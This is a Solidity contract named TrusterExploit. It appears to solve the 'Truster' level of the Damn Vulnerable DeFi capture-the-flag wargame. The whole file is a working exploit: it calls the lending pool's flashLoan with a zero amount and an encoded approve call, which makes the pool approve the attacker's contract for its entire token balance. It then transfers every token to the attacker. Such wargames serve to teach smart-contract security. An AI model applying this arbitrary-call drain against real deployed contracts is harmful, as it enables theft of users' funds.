// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "./TrusterLenderPool.sol";

contract TrusterExploit {

    TrusterLenderPool public immutable pool;
    address public immutable owner;

    constructor (address poolAddress) {
        pool = TrusterLenderPool(poolAddress);
        owner = msg.sender;
    }

    function exploit() external
    {
        IERC20 token = pool.damnValuableToken();
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.balanceOf(address(pool))
            )
        );
        token.transferFrom(address(pool), owner, token.balanceOf(address(pool)));
    }

}
